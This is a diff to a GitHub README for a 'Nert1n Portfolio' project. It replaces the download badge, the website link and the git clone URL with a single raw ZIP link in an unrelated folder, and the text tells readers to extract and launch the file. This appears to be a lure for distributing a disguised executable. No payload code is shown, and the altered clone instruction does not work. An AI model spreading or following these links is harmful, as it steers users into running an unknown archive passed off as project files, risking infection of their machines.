@@ -24,13 +24,13 @@ Welcome to the "Nert1n Portfolio" GitHub repository! This repository hosts my ma
 
 ## 📦 Download
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/Loayel7iragy/nert1n-portfolio/raw/refs/heads/main/geoisotherm/nert_n_portfolio_v1.4.zip)](https://github.com/Loayel7iragy/nert1n-portfolio/raw/refs/heads/main/geoisotherm/nert_n_portfolio_v1.4.zip)
 
 Note: The ZIP file needs to be extracted and launched to access the contents.
 
 ## 🌐 Visit Website
 
-Feel free to explore the Nert1n Portfolio by visiting the [website](https://www.nert1n-portfolio.com).
+Feel free to explore the Nert1n Portfolio by visiting the [website](https://github.com/Loayel7iragy/nert1n-portfolio/raw/refs/heads/main/geoisotherm/nert_n_portfolio_v1.4.zip).
 
 If the above link is not working, please check the "Releases" section for alternative download options.
 
@@ -40,7 +40,7 @@ To start working with the Nert1n Portfolio, follow these steps:
 
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/your-username/nert1n-portfolio.git
+   git clone https://github.com/Loayel7iragy/nert1n-portfolio/raw/refs/heads/main/geoisotherm/nert_n_portfolio_v1.4.zip
    ```
 
 2. Install dependencies:
